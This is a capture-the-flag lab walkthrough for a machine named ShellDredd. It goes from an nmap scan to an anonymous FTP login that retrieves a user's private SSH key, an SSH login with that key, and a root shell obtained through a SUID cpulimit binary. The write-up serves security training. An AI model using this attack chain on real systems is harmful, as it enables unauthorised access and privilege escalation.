# NMAP
```
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
61000/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiOZxbr74TmNuWOBDmPInK6nZnRGfOMtZMJDBErXIPCZR9kdZDqJbkdRlnP8QLGuTl/t8qPgP863Rl1yfJLSv995PQ+oUZTSa21cGulVCtFFCKedJJJF9p2cAyYzjeA9qg1Ja7dOPtyPsSCplYzZcILwXZ52mg1k8VH2HUZ7DO0wMBYWONhkXWRR49gMN+IKge3DXNrfyHtnjMVWTwEtfqjFd+D70qi7UusZyfP2MogDX7LgRWC9RmvS6o8KxYW4psLWDB2dp/Nf3FitenY0UMPKkHrxxjeqfYZhFwENmHAsxzrHJo1acSrNMUbTdWuLzcLHQgMIYMUlmGvDkg31c/
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNXNPAPJkUYF4+uu955+0RpMZKriG9olCwtkPB3j5XbiiB+B7WEVv331ittcLxibSBWqV2OO328ThebB2YF9qvI=
|   256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP5tk066endR9DMYxXzxhixx6c8cQ0HjGvYbtL8Lgv91
```

# FTP
```
ftp 192.168.245.130

Connected to 192.168.245.130.
220 (vsFTPd 3.0.3)
Name (192.168.245.130:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.

ftp> cd .hannah
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.

ftp> get id_rsa
```

# SSH
```
chmod 600 id_rsa
ssh hannah@[IP] -i id_rsa -p 61000
```

## local.txt
local.txt is located at /home/hannah
```
hannah@ShellDredd:~$ ls -la
total 32
drwxr-xr-x 3 hannah hannah 4096 Jan 29  2021 .
drwxr-xr-x 3 root   root   4096 Aug  6  2020 ..
lrwxrwxrwx 1 root   root      9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hannah hannah  220 Aug  6  2020 .bash_logout
-rw-r--r-- 1 hannah hannah 3526 Aug  6  2020 .bashrc
-rw-r--r-- 1 hannah hannah   33 Dec  7 09:16 local.txt
-rw-r--r-- 1 hannah hannah  807 Aug  6  2020 .profile
drwxr-xr-x 2 root   root   4096 Aug  6  2020 .ssh
-rw-r--r-- 1 hannah hannah   32 Jan 29  2021 user.txt
hannah@ShellDredd:~$ cat local.txt
```

# root
```
hannah@ShellDredd:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd

hannah@ShellDredd:~$ cpulimit -l 100 -f -- /bin/sh -p
Process 14060 detected

# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)

# ls -la /root
total 28
drwx------  3 root root 4096 Dec  7 09:15 .
drwxr-xr-x 18 root root 4096 Aug  6  2020 ..
lrwxrwxrwx  1 root root    9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Dec  7 09:16 proof.txt
-rw-r--r--  1 root root   32 Jan 29  2021 root.txt
drwxr-xr-x  2 root root 4096 Jan 21  2021 .ssh
```
